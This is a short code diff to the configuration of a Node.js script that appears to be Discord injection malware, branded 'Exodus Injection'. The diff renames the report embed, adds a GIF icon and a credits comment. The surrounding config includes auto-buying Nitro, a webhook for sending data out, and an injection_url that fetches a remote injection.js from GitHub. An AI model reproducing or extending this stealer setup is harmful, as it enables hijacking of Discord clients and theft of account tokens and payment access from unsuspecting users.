@@ -1,3 +1,5 @@
+/* Btw credits to whom it may concern */
+
 const args = process.argv;
 const fs = require("fs");
 const path = require("path");
@@ -10,8 +12,8 @@ const config = {
     auto_buy_nitro: false,
     ping_on_run: false,
     ping_val: "@here",
-    embed_name: "ewe",
-    embed_icon: "ewe",
+    embed_name: "Exodus Injection",
+    embed_icon: "https://media.tenor.com/7NI3qoRF7BsAAAAC/anime-dance.gif",
     embed_color: 8363488,
     webhook: "ewe",
     injection_url: "https://raw.githubusercontent.com/zEncrypte/-/main/tgbrs/js/injection.js",
